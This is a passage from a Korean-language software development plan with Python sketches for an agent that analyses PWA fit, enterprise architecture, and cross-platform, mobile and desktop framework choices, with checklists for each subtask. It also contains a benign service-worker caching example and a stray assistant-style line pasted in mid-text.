        recommended_features = self._determine_pwa_features(requirements)

        # 구현 복잡도 평가
        complexity = self._assess_pwa_complexity(recommended_features, requirements)

        # 오프라인 전략 수립
        offline_strategy = self._design_offline_strategy(requirements)

        # 성능 영향 분석
        performance_impact = self._analyze_performance_impact(recommended_features)

        # 플랫폼별 고려사항
        platform_considerations = self._get_platform_considerations()

        return PWAAnalysis(
            pwa_score=pwa_score,
            recommended_features=recommended_features,
            implementation_complexity=complexity,
            offline_strategy=offline_strategy,
            performance_impact=performance_impact,
            platform_specific_considerations=platform_considerations
        )

    def _calculate_pwa_score(
        self,
        requirements: ProjectRequirements
    ) -> float:
        """PWA 적합도 점수 계산"""

        score = 5.0  # 기본 점수
        requirement_text = ' '.join(requirements.technical_requirements).lower()

        # PWA 긍정 지표
        pwa_indicators = {
            'offline': 2.0,
            'mobile': 1.5,
            'app-like': 1.5,
            'installable': 2.0,
            'push notification': 1.5,
            'progressive': 1.0,
            'responsive': 1.0,
            'fast': 0.5
        }

        for indicator, weight in pwa_indicators.items():
            if indicator in requirement_text:
                score += weight

        # 프로젝트 타입 고려
        if requirements.project_type in ['mobile', 'hybrid']:
            score += 1.0

        # 부정 지표
        if 'native-only' in requirement_text:
            score -= 3.0

        return min(10.0, max(0.0, score))

    def _design_offline_strategy(
        self,
        requirements: ProjectRequirements
    ) -> Dict[str, Any]:
        """오프라인 전략 설계"""

        strategy = {
            'caching_strategy': 'network-first',
            'cached_resources': [],
            'offline_pages': [],
            'sync_strategy': None,
            'storage_estimate': '50MB'
        }

        requirement_text = ' '.join(requirements.technical_requirements).lower()

        # 캐싱 전략 결정
        if 'real-time' in requirement_text:
            strategy['caching_strategy'] = 'network-first'
        elif 'performance' in requirement_text:
            strategy['caching_strategy'] = 'cache-first'
        else:
            strategy['caching_strategy'] = 'stale-while-revalidate'

        # 캐시할 리소스 결정
        strategy['cached_resources'] = [
            'app-shell',
            'core-js-bundles',
            'css-files',
            'font-files',
            'critical-images'
        ]

        # 오프라인 페이지
        strategy['offline_pages'] = [
            '/offline',
            '/error',
            'cached-content-pages'
        ]

        # 동기화 전략
        if 'form' in requirement_text or 'data-entry' in requirement_text:
            strategy['sync_strategy'] = {
                'type': 'background-sync',
                'retry_strategy': 'exponential-backoff',
                'max_retries': 3
            }

        # Service Worker 구현 예제
        strategy['implementation_example'] = """
// service-worker.js
const CACHE_NAME = 'app-v1';
const urlsToCache = [
  '/',
  '/styles/main.css',
  '/scripts/main.js',
  '/offline'
];

// Install event
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(urlsToCache))
  );
});

// Fetch event with network-first strategy
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request)
      .then(response => {
        // Cache successful responses
        if (response && response.status === 200) {
          const responseToCache = response.clone();
          caches.open(CACHE_NAME)
            .then(cache => {
              cache.put(event.request, responseToCache);
            });
        }
        return response;
      })
      .catch(() => {
        // Fallback to cache
        return caches.match(event.request)
          .then(response => {
            if (response) {
              return response;
            }
            // Show offline page for navigation requests
            if (event.request.mode === 'navigate') {
              return caches.match('/offline');
            }
          });
      })
  );
});
"""

        return strategy

    async def analyze_mobile_optimization(
        self,
        requirements: ProjectRequirements
    ) -> MobileOptimization:
        """모바일 최적화 분석"""

        # 모바일 우선 점수 계산
        mobile_first_score = self._calculate_mobile_first_score(requirements)

        # 반응형 전략 결정
        responsive_strategy = self._determine_responsive_strategy(requirements)

        # 터치 최적화
        touch_optimization = self._define_touch_optimizations()

        # 성능 예산 설정
        performance_budget = self._set_performance_budget(requirements)

        # 모바일 특화 기능
        mobile_features = self._identify_mobile_features(requirements)

        return MobileOptimization(
            mobile_first_score=mobile_first_score,
            responsive_strategy=responsive_strategy,
            touch_optimization=touch_optimization,
            performance_budget=performance_budget,
            mobile_specific_features=mobile_features
        )

    def _set_performance_budget(
        self,
        requirements: ProjectRequirements
    ) -> Dict[str, Any]:
        """성능 예산 설정"""

        # 기본 예산
        budget = {
            'javascript': {
                'compressed': '100KB',
                'uncompressed': '300KB'
            },
            'css': {
                'compressed': '30KB',
                'uncompressed': '100KB'
            },
            'images': {
                'total': '500KB',
                'per_image': '100KB'
            },
            'fonts': {
                'total': '100KB',
                'font_files': 3
            },
            'metrics': {
                'first_contentful_paint': '1.8s',
                'time_to_interactive': '3.8s',
                'speed_index': '3.0s',
                'largest_contentful_paint': '2.5s'
            }
        }

        # 프로젝트 규모에 따른 조정
        if requirements.scale == 'enterprise':
            budget['javascript']['compressed'] = '200KB'
            budget['metrics']['time_to_interactive'] = '5.0s'
        elif requirements.scale == 'prototype':
            budget['javascript']['compressed'] = '50KB'
            budget['metrics']['time_to_interactive'] = '2.5s'

        return budget

    def get_framework_pwa_support(
        self,
        framework: str
    ) -> Dict[str, Any]:
        """프레임워크별 PWA 지원 현황"""

        pwa_support = {
            'react': {
                'native_support': False,
                'setup_complexity': 'medium',
                'recommended_tools': ['create-react-app', 'workbox'],
                'libraries': ['react-app-rewired', 'react-pwa']
            },
            'vue': {
                'native_support': True,
                'setup_complexity': 'low',
                'recommended_tools': ['@vue/cli-plugin-pwa'],
                'libraries': ['vue-pwa', 'register-service-worker']
            },
            'angular': {
                'native_support': True,
                'setup_complexity': 'low',
                'recommended_tools': ['@angular/pwa'],
                'libraries': ['@angular/service-worker']
            },
            'nextjs': {
                'native_support': False,
                'setup_complexity': 'medium',
                'recommended_tools': ['next-pwa'],
                'libraries': ['workbox-webpack-plugin']
            }
        }

        return pwa_support.get(framework, {
            'native_support': False,
            'setup_complexity': 'high'
        })
```

**검증 기준**:

- [ ] PWA 적합도 평가
- [ ] 오프라인 전략 설계
- [ ] 모바일 성능 예산
- [ ] 프레임워크별 PWA 지원

---

### SubTask 4.13.4: 엔터프라이즈 애플리케이션 전략

**담당자**: 엔터프라이즈 아키텍트  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/enterprise_strategy.py
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

@dataclass
class EnterpriseRequirements:
    scalability_needs: List[str]
    security_requirements: List[str]
    compliance_standards: List[str]
    integration_points: List[str]
    team_size: str
    maintenance_window: str
    sla_requirements: Dict[str, float]

@dataclass
class EnterpriseStrategy:
    architecture_pattern: str
    recommended_framework: str
    scaling_strategy: Dict[str, Any]
    security_measures: List[Dict[str, Any]]
    devops_requirements: Dict[str, Any]
    monitoring_strategy: Dict[str, Any]
    disaster_recovery: Dict[str, Any]
    cost_estimation: Dict[str, float]

class EnterpriseApplicationAnalyzer:
    """엔터프라이즈 애플리케이션 전략 분석기"""

    def __init__(self):
        self.enterprise_patterns = self._initialize_patterns()
        self.security_frameworks = self._load_security_frameworks()
        self.compliance_mappings = self._load_compliance_mappings()

    def _initialize_patterns(self) -> Dict[str, Dict[str, Any]]:
        """엔터프라이즈 패턴 초기화"""
        return {
            'micro_frontend': {
                'description': 'Independent deployable frontend modules',
                'suitable_for': ['large_teams', 'multiple_products', 'gradual_migration'],
                'frameworks': {
                    'module_federation': ['webpack5', 'react', 'angular'],
                    'single_spa': ['react', 'vue', 'angular'],
                    'qiankun': ['react', 'vue', 'angular']
                },
                'complexity': 'high',
                'benefits': [
                    'team_autonomy',
                    'independent_deployment',
                    'technology_diversity',
                    'gradual_modernization'
                ]
            },
            'monolithic_spa': {
                'description': 'Single large application',
                'suitable_for': ['small_teams', 'single_product', 'rapid_development'],
                'frameworks': ['angular', 'react', 'vue'],
                'complexity': 'medium',
                'benefits': [
                    'simpler_deployment',
                    'consistent_ux',
                    'easier_state_management'
                ]
            },
            'component_library': {
                'description': 'Shared component system',
                'suitable_for': ['design_consistency', 'multiple_applications'],
                'frameworks': {
                    'react': ['storybook', 'bit', 'lerna'],
                    'vue': ['vue-styleguidist', 'storybook'],
                    'angular': ['angular-libraries', 'storybook']
                },
                'complexity': 'medium'
            }
        }

    async def analyze_enterprise_requirements(
        self,
        requirements: ProjectRequirements
    ) -> EnterpriseStrategy:
        """엔터프라이즈 요구사항 분석"""

        # 엔터프라이즈 요구사항 추출
        enterprise_reqs = self._extract_enterprise_requirements(requirements)

        # 아키텍처 패턴 결정
        architecture_pattern = self._determine_architecture_pattern(
            enterprise_reqs,
            requirements
        )

        # 프레임워크 추천
        recommended_framework = self._recommend_enterprise_framework(
            architecture_pattern,
            enterprise_reqs
        )

        # 확장 전략
        scaling_strategy = self._design_scaling_strategy(
            enterprise_reqs,
            architecture_pattern
        )

        # 보안 조치
        security_measures = self._define_security_measures(
            enterprise_reqs.security_requirements
        )

        # DevOps 요구사항
        devops_requirements = self._define_devops_requirements(
            architecture_pattern,
            enterprise_reqs
        )

        # 모니터링 전략
        monitoring_strategy = self._design_monitoring_strategy(
            enterprise_reqs
        )

        # 재해 복구
        disaster_recovery = self._plan_disaster_recovery(
            enterprise_reqs
        )

        # 비용 추정
        cost_estimation = self._estimate_costs(
            architecture_pattern,
            enterprise_reqs,
            recommended_framework
        )

        return EnterpriseStrategy(
            architecture_pattern=architecture_pattern,
            recommended_framework=recommended_framework,
            scaling_strategy=scaling_strategy,
            security_measures=security_measures,
            devops_requirements=devops_requirements,
            monitoring_strategy=monitoring_strategy,
            disaster_recovery=disaster_recovery,
            cost_estimation=cost_estimation
        )

    def _determine_architecture_pattern(
        self,
        enterprise_reqs: EnterpriseRequirements,
        requirements: ProjectRequirements
    ) -> str:
        """아키텍처 패턴 결정"""

        # 팀 규모와 제품 복잡도 고려
        if int(enterprise_reqs.team_size.split('-')[0]) > 50:
            if len(enterprise_reqs.integration_points) > 10:
                return 'micro_frontend'
            else:
                return 'modular_monolith'

        # 확장성 요구사항 고려
        if 'horizontal_scaling' in enterprise_reqs.scalability_needs:
            return 'micro_frontend'

        # 기본적으로 모놀리식 SPA
        return 'monolithic_spa'

    def _recommend_enterprise_framework(
        self,
        architecture_pattern: str,
        enterprise_reqs: EnterpriseRequirements
    ) -> str:
        """엔터프라이즈 프레임워크 추천"""

        framework_scores = {
            'angular': 0,
            'react': 0,
            'vue': 0
        }

        # Angular 점수
        if 'typescript' in str(enterprise_reqs.__dict__):
            framework_scores['angular'] += 2
        if 'enterprise' in str(enterprise_reqs.__dict__):
            framework_scores['angular'] += 2
        if architecture_pattern == 'monolithic_spa':
            framework_scores['angular'] += 1

        # React 점수
        if architecture_pattern == 'micro_frontend':
            framework_scores['react'] += 2
        if 'flexibility' in str(enterprise_reqs.__dict__):
            framework_scores['react'] += 1
        if len(enterprise_reqs.integration_points) > 5:
            framework_scores['react'] += 1

        # Vue 점수
        if 'rapid_development' in str(enterprise_reqs.__dict__):
            framework_scores['vue'] += 2
        if int(enterprise_reqs.team_size.split('-')[0]) < 20:
            framework_scores['vue'] += 1

        # 최고 점수 프레임워크 반환
        return max(framework_scores, key=framework_scores.get)

    def _design_scaling_strategy(
        self,
        enterprise_reqs: EnterpriseRequirements,
        architecture_pattern: str
    ) -> Dict[str, Any]:
        """확장 전략 설계"""

        strategy = {
            'horizontal_scaling': {
                'enabled': 'horizontal_scaling' in enterprise_reqs.scalability_needs,
                'approach': 'container_orchestration',
                'tools': ['kubernetes', 'docker'],
                'auto_scaling': {
                    'min_instances': 3,
                    'max_instances': 50,
                    'cpu_threshold': 70,
                    'memory_threshold': 80
                }
            },
            'vertical_scaling': {
                'initial_resources': {
                    'cpu': '2 cores',
                    'memory': '4GB'
                },
                'max_resources': {
                    'cpu': '8 cores',
                    'memory': '16GB'
                }
            },
            'cdn_strategy': {
                'provider': 'cloudflare',
                'cache_rules': {
                    'static_assets': '1 year',
                    'api_responses': '5 minutes',
                    'html': 'no-cache'
                }
            },
            'database_scaling': {
                'read_replicas': True,
                'sharding': architecture_pattern == 'micro_frontend',
                'connection_pooling': {
                    'min_connections': 10,
                    'max_connections': 100
                }
            }
        }

        return strategy

    def _define_security_measures(
        self,
        security_requirements: List[str]
    ) -> List[Dict[str, Any]]:
        """보안 조치 정의"""

        measures = []

        # 기본 보안 조치
        measures.append({
            'name': 'Authentication & Authorization',
            'implementation': {
                'method': 'OAuth2.0 / SAML',
                'provider': 'Auth0 / Okta',
                'mfa': True,
                'session_management': 'JWT with refresh tokens'
            }
        })

        measures.append({
            'name': 'Data Encryption',
            'implementation': {
                'in_transit': 'TLS 1.3',
                'at_rest': 'AES-256',
                'key_management': 'AWS KMS / HashiCorp Vault'
            }
        })

        measures.append({
            'name': 'Input Validation',
            'implementation': {
                'client_side': 'Schema validation',
                'server_side': 'Strict validation & sanitization',
                'sql_injection': 'Parameterized queries',
                'xss_prevention': 'Content Security Policy'
            }
        })

        # OWASP Top 10 대응
        measures.append({
            'name': 'OWASP Compliance',
            'implementation': {
                'broken_access_control': 'Role-based access control',
                'cryptographic_failures': 'Strong encryption standards',
                'injection': 'Input validation & sanitization',
                'insecure_design': 'Threat modeling & secure SDLC',
                'security_misconfiguration': 'Automated security scanning'
            }
        })

        # 컴플라이언스별 추가 조치
        if 'GDPR' in security_requirements:
            measures.append({
                'name': 'GDPR Compliance',
                'implementation': {
                    'data_privacy': 'Personal data encryption',
                    'right_to_erasure': 'Data deletion workflows',
                    'consent_management': 'Explicit consent tracking'
                }
            })

        if 'HIPAA' in security_requirements:
            measures.append({
                'name': 'HIPAA Compliance',
                'implementation': {
                    'access_control': 'Strict role-based access',
                    'audit_logs': 'Comprehensive audit trail',
                    'data_integrity': 'Checksums and validation'
                }
            })

        return measures

    def _design_monitoring_strategy(
        self,
        enterprise_reqs: EnterpriseRequirements
    ) -> Dict[str, Any]:
        """모니터링 전략 설계"""

        return {
            'apm': {
                'tool': 'New Relic / Datadog',
                'metrics': [
                    'response_time',
                    'error_rate',
                    'throughput',
                    'apdex_score'
                ]
            },
            'logging': {
                'centralized_logging': 'ELK Stack / Splunk',
                'log_levels': ['ERROR', 'WARN', 'INFO', 'DEBUG'],
                'retention': '90 days',
                'real_time_alerts': True
            },
            'user_analytics': {
                'tool': 'Google Analytics / Mixpanel',
                'tracked_events': [
                    'page_views',
                    'user_actions',
                    'conversion_funnel',
                    'session_duration'
                ]
            },
            'synthetic_monitoring': {
                'tool': 'Pingdom / Datadog Synthetics',
                'check_frequency': '5 minutes',
                'locations': ['US-East', 'EU-West', 'APAC']
            },
            'custom_dashboards': {
                'business_metrics': 'Grafana',
                'technical_metrics': 'Kibana',
                'executive_dashboard': 'Custom React dashboard'
            }
        }
```

**검증 기준**:

- [ ] 엔터프라이즈 아키텍처 패턴
- [ ] 확장성 전략 설계
- [ ] 보안 및 컴플라이언스
- [ ] 모니터링 및 운영 전략

---

UI Agent 개발 계획을 작성하겠습니다. 먼저 프로젝트 지식베이스에서 관련 정보를 검색해보겠습니다.## Task 4.14: 다중 플랫폼 지원

### SubTask 4.14.1: 크로스 플랫폼 프레임워크 분석

**담당자**: 프론트엔드 아키텍트  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/cross_platform_analyzer.py
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum

@dataclass
class CrossPlatformCapability:
    """크로스 플랫폼 지원 능력 평가"""
    framework: str
    platforms: List[str]  # ['web', 'ios', 'android', 'desktop']
    code_reusability: float  # 0-1 범위
    performance_overhead: Dict[str, float]  # 플랫폼별 오버헤드
    native_features_access: Dict[str, List[str]]  # 플랫폼별 네이티브 기능
    development_efficiency: float
    maintenance_cost: str  # 'low', 'medium', 'high'

class CrossPlatformAnalyzer:
    """크로스 플랫폼 프레임워크 분석기"""

    FRAMEWORK_CAPABILITIES = {
        'react_native': {
            'platforms': ['ios', 'android', 'web'],
            'code_reusability': 0.85,
            'performance_overhead': {'ios': 0.1, 'android': 0.15, 'web': 0.2},
            'native_features': {
                'camera': True,
                'gps': True,
                'push_notifications': True,
                'file_system': True,
                'biometric_auth': True
            },
            'development_tools': ['expo', 'react-native-cli'],
            'bridge_type': 'javascript_bridge'
        },
        'flutter': {
            'platforms': ['ios', 'android', 'web', 'desktop'],
            'code_reusability': 0.95,
            'performance_overhead': {'ios': 0.05, 'android': 0.05, 'web': 0.15},
            'native_features': {
                'camera': True,
                'gps': True,
                'push_notifications': True,
                'file_system': True,
                'biometric_auth': True
            },
            'development_tools': ['flutter_sdk', 'dart_devtools'],
            'bridge_type': 'compiled_native'
        },
        'ionic': {
            'platforms': ['ios', 'android', 'web', 'pwa'],
            'code_reusability': 0.9,
            'performance_overhead': {'ios': 0.2, 'android': 0.2, 'web': 0.0},
            'native_features': {
                'camera': True,
                'gps': True,
                'push_notifications': True,
                'file_system': True,
                'biometric_auth': True
            },
            'development_tools': ['capacitor', 'cordova'],
            'bridge_type': 'webview_bridge'
        },
        'electron': {
            'platforms': ['windows', 'macos', 'linux'],
            'code_reusability': 1.0,
            'performance_overhead': {'desktop': 0.3},
            'native_features': {
                'file_system': True,
                'notifications': True,
                'system_tray': True,
                'auto_update': True
            },
            'development_tools': ['electron-builder', 'electron-forge'],
            'bridge_type': 'chromium_runtime'
        }
    }

    async def analyze_requirements(
        self,
        target_platforms: List[str],
        features_required: List[str],
        performance_requirements: Dict[str, Any]
    ) -> List[CrossPlatformCapability]:
        """요구사항에 따른 크로스 플랫폼 프레임워크 분석"""

        suitable_frameworks = []

        for framework, capabilities in self.FRAMEWORK_CAPABILITIES.items():
            # 플랫폼 지원 확인
            platform_coverage = self._calculate_platform_coverage(
                target_platforms,
                capabilities['platforms']
            )

            if platform_coverage < 0.8:  # 80% 미만 지원시 제외
                continue

            # 성능 요구사항 확인
            if not self._meets_performance_requirements(
                performance_requirements,
                capabilities['performance_overhead']
            ):
                continue

            # 기능 지원 확인
            feature_support = self._check_feature_support(
                features_required,
                capabilities['native_features']
            )

            capability = CrossPlatformCapability(
                framework=framework,
                platforms=capabilities['platforms'],
                code_reusability=capabilities['code_reusability'],
                performance_overhead=capabilities['performance_overhead'],
                native_features_access=capabilities['native_features'],
                development_efficiency=self._calculate_dev_efficiency(capabilities),
                maintenance_cost=self._estimate_maintenance_cost(capabilities)
            )

            suitable_frameworks.append(capability)

        return sorted(
            suitable_frameworks,
            key=lambda x: x.development_efficiency,
            reverse=True
        )
```

**검증 기준**:

- [ ] 주요 크로스 플랫폼 프레임워크 포함
- [ ] 플랫폼별 성능 분석
- [ ] 네이티브 기능 접근성 평가
- [ ] 개발 효율성 측정

### SubTask 4.14.2: 모바일 프레임워크 통합

**담당자**: 모바일 개발자  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/mobile_framework_integration.py
from typing import Dict, List, Optional, Any
import asyncio
from datetime import datetime

class MobileFrameworkIntegration:
    """모바일 프레임워크 통합 및 평가"""

    def __init__(self):
        self.mobile_frameworks = {
            'react_native': MobileFrameworkAdapter('react_native'),
            'flutter': MobileFrameworkAdapter('flutter'),
            'ionic': MobileFrameworkAdapter('ionic'),
            'nativescript': MobileFrameworkAdapter('nativescript'),
            'xamarin': MobileFrameworkAdapter('xamarin')
        }

    async def evaluate_mobile_requirements(
        self,
        project_requirements: Dict[str, Any]
    ) -> Dict[str, Any]:
        """모바일 프로젝트 요구사항 평가"""

        evaluation_results = {
            'recommended_framework': None,
            'compatibility_matrix': {},
            'performance_analysis': {},
            'development_considerations': {}
        }

        # 1. 플랫폼 타겟 분석
        target_platforms = project_requirements.get('platforms', [])
        ios_required = 'ios' in target_platforms
        android_required = 'android' in target_platforms

        # 2. 성능 요구사항 분석
        performance_critical = project_requirements.get('performance_critical', False)
        animation_heavy = 'animations' in project_requirements.get('features', [])

        # 3. 네이티브 기능 요구사항
        native_features = project_requirements.get('native_features', [])

        # 4. 각 프레임워크별 평가
        framework_scores = {}

        for framework_name, adapter in self.mobile_frameworks.items():
            score = await self._evaluate_framework(
                adapter,
                ios_required,
                android_required,
                performance_critical,
                animation_heavy,
                native_features
            )
            framework_scores[framework_name] = score

        # 5. 최적 프레임워크 선택
        best_framework = max(framework_scores, key=framework_scores.get)
        evaluation_results['recommended_framework'] = best_framework
        evaluation_results['compatibility_matrix'] = framework_scores

        # 6. 상세 분석 결과 생성
        evaluation_results['performance_analysis'] = await self._analyze_performance(
            best_framework,
            project_requirements
        )

        evaluation_results['development_considerations'] = await self._get_dev_considerations(
            best_framework,
            project_requirements
        )

        return evaluation_results

    async def _evaluate_framework(
        self,
        adapter: 'MobileFrameworkAdapter',
        ios_required: bool,
        android_required: bool,
        performance_critical: bool,
        animation_heavy: bool,
        native_features: List[str]
    ) -> float:
        """개별 프레임워크 평가"""

        score = 0.0

        # 플랫폼 지원 점수 (40%)
        platform_score = 0.0
        if adapter.supports_ios and ios_required:
            platform_score += 0.2
        if adapter.supports_android and android_required:
            platform_score += 0.2
        score += platform_score

        # 성능 점수 (30%)
        if performance_critical:
            score += adapter.performance_score * 0.3
        else:
            score += 0.3  # 성능이 중요하지 않으면 만점

        # 애니메이션 지원 (10%)
        if animation_heavy:
            score += adapter.animation_support * 0.1
        else:
            score += 0.1

        # 네이티브 기능 지원 (20%)
        feature_support = sum(
            1 for feature in native_features
            if feature in adapter.supported_native_features
        ) / max(len(native_features), 1)
        score += feature_support * 0.2

        return score

class MobileFrameworkAdapter:
    """모바일 프레임워크 어댑터"""

    def __init__(self, framework_name: str):
        self.framework_name = framework_name
        self.config = self._load_framework_config(framework_name)

    @property
    def supports_ios(self) -> bool:
        return 'ios' in self.config['platforms']

    @property
    def supports_android(self) -> bool:
        return 'android' in self.config['platforms']

    @property
    def performance_score(self) -> float:
        return self.config.get('performance_score', 0.7)

    @property
    def animation_support(self) -> float:
        return self.config.get('animation_support', 0.7)

    @property
    def supported_native_features(self) -> List[str]:
        return self.config.get('native_features', [])
```

**검증 기준**:

- [ ] 5개 이상의 모바일 프레임워크 지원
- [ ] iOS/Android 플랫폼별 평가
- [ ] 네이티브 기능 지원 매트릭스
- [ ] 성능 벤치마크 통합

### SubTask 4.14.3: 데스크톱 애플리케이션 지원

**담당자**: 데스크톱 개발자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/desktop_framework_support.py
from typing import Dict, List, Optional, Tuple
from enum import Enum
import platform

class DesktopPlatform(Enum):
    WINDOWS = "windows"
    MACOS = "macos"
    LINUX = "linux"

class DesktopFrameworkSupport:
    """데스크톱 애플리케이션 프레임워크 지원"""

    DESKTOP_FRAMEWORKS = {
        'electron': {
            'platforms': ['windows', 'macos', 'linux'],
            'languages': ['javascript', 'typescript'],
            'ui_frameworks': ['react', 'vue', 'angular', 'svelte'],
            'bundle_size': 'large',  # 50-150MB
            'performance': 'moderate',
            'native_integration': 'good',
            'distribution': ['exe', 'dmg', 'appimage', 'snap', 'deb'],
            'auto_update': True,
            'code_signing': True
        },
        'tauri': {
            'platforms': ['windows', 'macos', 'linux'],
            'languages': ['rust', 'javascript', 'typescript'],
            'ui_frameworks': ['react', 'vue', 'svelte', 'vanilla'],
            'bundle_size': 'small',  # 10-30MB
            'performance': 'excellent',
            'native_integration': 'excellent',
            'distribution': ['msi', 'dmg', 'appimage', 'deb'],
            'auto_update': True,
            'code_signing': True
        },
        'flutter_desktop': {
            'platforms': ['windows', 'macos', 'linux'],
            'languages': ['dart'],
            'ui_frameworks': ['flutter'],
            'bundle_size': 'medium',  # 30-60MB
            'performance': 'good',
            'native_integration': 'good',
            'distribution': ['exe', 'dmg', 'snap'],
            'auto_update': False,
            'code_signing': True
        },
        'qt': {
            'platforms': ['windows', 'macos', 'linux'],
            'languages': ['python', 'c++'],
            'ui_frameworks': ['qt_widgets', 'qt_quick'],
            'bundle_size': 'medium',
            'performance': 'excellent',
            'native_integration': 'excellent',
            'distribution': ['exe', 'dmg', 'appimage'],
            'auto_update': False,
            'code_signing': True
        }
    }

    async def analyze_desktop_requirements(
        self,
        requirements: Dict[str, Any]
    ) -> Dict[str, Any]:
        """데스크톱 애플리케이션 요구사항 분석"""

        target_platforms = requirements.get('platforms', ['windows', 'macos', 'linux'])
        performance_needs = requirements.get('performance', 'moderate')
        bundle_size_constraint = requirements.get('bundle_size', 'any')
        required_features = requirements.get('features', [])

        recommendations = []

        for framework, config in self.DESKTOP_FRAMEWORKS.items():
            score = 0.0
            reasons = []

            # 플랫폼 지원 확인
            platform_coverage = len(
                set(target_platforms) & set(config['platforms'])
            ) / len(target_platforms)
            score += platform_coverage * 0.3

            if platform_coverage == 1.0:
                reasons.append(f"Supports all target platforms: {', '.join(target_platforms)}")

            # 성능 평가
            performance_map = {
                'excellent': 1.0,
                'good': 0.8,
                'moderate': 0.6
            }

            perf_score = performance_map.get(config['performance'], 0.5)
            if performance_needs == 'high' and perf_score >= 0.8:
                score += 0.3
                reasons.append("Meets high performance requirements")
            elif performance_needs == 'moderate':
                score += 0.2

            # 번들 크기 평가
            if bundle_size_constraint != 'any':
                if bundle_size_constraint == 'small' and config['bundle_size'] == 'small':
                    score += 0.2
                    reasons.append("Small bundle size")
                elif bundle_size_constraint == 'medium' and config['bundle_size'] in ['small', 'medium']:
                    score += 0.1

            # 기능 지원 확인
            feature_score = 0.0
            for feature in required_features:
                if feature == 'auto_update' and config.get('auto_update'):
                    feature_score += 0.1
                    reasons.append("Supports auto-update")
                elif feature == 'system_tray':
                    feature_score += 0.1
                    reasons.append("System tray support")

            score += min(feature_score, 0.2)

            recommendations.append({
                'framework': framework,
                'score': score,
                'reasons': reasons,
                'config': config
            })

        # 점수순 정렬
        recommendations.sort(key=lambda x: x['score'], reverse=True)

        return {
            'primary_recommendation': recommendations[0] if recommendations else None,
            'alternatives': recommendations[1:3] if len(recommendations) > 1 else [],
            'detailed_comparison': self._create_comparison_matrix(recommendations[:3])
        }
```

**검증 기준**:

- [ ] Windows/macOS/Linux 지원
- [ ] 번들 크기 분석
- [ ] 네이티브 통합 수준 평가
- [ ] 배포 및 업데이트 전략

### SubTask 4.14.4: 웹/모바일/데스크톱 통합 전략

**담당자**: 솔루션 아키텍트  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/platform_integration_strategy.py
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from datetime import datetime

@dataclass
class IntegrationStrategy:
    """플랫폼 통합 전략"""
    strategy_name: str
    primary_framework: str
    secondary_frameworks: List[str]
    code_sharing_percentage: float
    development_effort: Dict[str, float]  # 플랫폼별 개발 노력
    maintenance_complexity: str
    recommended_architecture: str
    toolchain: List[str]

class PlatformIntegrationStrategy:
    """웹/모바일/데스크톱 통합 전략 수립"""

    INTEGRATION_PATTERNS = {
        'unified_codebase': {
            'description': 'Single codebase for all platforms',
            'frameworks': ['flutter', 'react_native_web', 'ionic'],
            'code_sharing': 0.8,
            'pros': ['일관된 코드베이스', '빠른 개발', '쉬운 유지보수'],
            'cons': ['플랫폼별 최적화 제한', '성능 오버헤드']
        },
        'shared_core': {
            'description': 'Shared business logic with platform-specific UI',
            'frameworks': ['react_native', 'kotlin_multiplatform', 'rust_core'],
            'code_sharing': 0.6,
            'pros': ['플랫폼 최적화 가능', '네이티브 성능'],
            'cons': ['복잡한 아키텍처', '더 많은 개발 리소스']
        },
        'progressive_web': {
            'description': 'PWA as primary with native wrappers',
            'frameworks': ['pwa', 'capacitor', 'electron'],
            'code_sharing': 0.9,
            'pros': ['단일 코드베이스', '쉬운 배포'],
            'cons': ['네이티브 기능 제한', '오프라인 기능 제약']
        },
        'micro_frontends': {
            'description': 'Independent apps with shared components',
            'frameworks': ['module_federation', 'single_spa'],
            'code_sharing': 0.4,
            'pros': ['독립적 배포', '기술 스택 유연성'],
            'cons': ['복잡한 통합', '일관성 유지 어려움']
        }
    }

    async def create_integration_strategy(
        self,
        project_requirements: Dict[str, Any]
    ) -> IntegrationStrategy:
        """프로젝트 요구사항에 맞는 통합 전략 수립"""

        # 요구사항 분석
        target_platforms = project_requirements.get('platforms', [])
        budget_constraint = project_requirements.get('budget', 'medium')
        timeline = project_requirements.get('timeline', 'normal')
        team_size = project_requirements.get('team_size', 'medium')
        performance_critical = project_requirements.get('performance_critical', False)

        # 플랫폼 조합 분석
        platform_combo = self._analyze_platform_combination(target_platforms)

        # 최적 전략 선택
        if len(target_platforms) >= 3 and budget_constraint == 'low':
            # 예산이 제한적이고 여러 플랫폼 지원 필요
            strategy = 'unified_codebase'
        elif performance_critical and 'mobile' in platform_combo:
            # 성능이 중요하고 모바일 포함
            strategy = 'shared_core'
        elif 'web' in target_platforms and len(target_platforms) <= 2:
            # 웹 중심의 간단한 멀티 플랫폼
            strategy = 'progressive_web'
        else:
            strategy = 'micro_frontends'

        # 전략 상세 구성
        return await self._build_detailed_strategy(
            strategy,
            project_requirements,
            platform_combo
        )

    async def _build_detailed_strategy(
        self,
        strategy_name: str,
        requirements: Dict[str, Any],
        platform_combo: Dict[str, bool]
    ) -> IntegrationStrategy:
        """상세 통합 전략 구성"""

        pattern = self.INTEGRATION_PATTERNS[strategy_name]

        # 주요 프레임워크 선택
        primary_framework = await self._select_primary_framework(
            pattern['frameworks'],
            requirements
        )

        # 보조 프레임워크 선택
        secondary_frameworks = await self._select_secondary_frameworks(
            primary_framework,
            platform_combo,
            requirements
        )

        # 개발 노력 계산
        dev_effort = self._calculate_development_effort(
            strategy_name,
            platform_combo,
            pattern['code_sharing']
        )

        # 권장 아키텍처 결정
        architecture = self._determine_architecture(
            strategy_name,
            requirements
        )

        # 툴체인 구성
        toolchain = self._compose_toolchain(
            primary_framework,
            secondary_frameworks,
            platform_combo
        )

        return IntegrationStrategy(
            strategy_name=strategy_name,
            primary_framework=primary_framework,
            secondary_frameworks=secondary_frameworks,
            code_sharing_percentage=pattern['code_sharing'],
            development_effort=dev_effort,
            maintenance_complexity=self._assess_maintenance_complexity(
                strategy_name,
                len(secondary_frameworks)
            ),
            recommended_architecture=architecture,
            toolchain=toolchain
        )
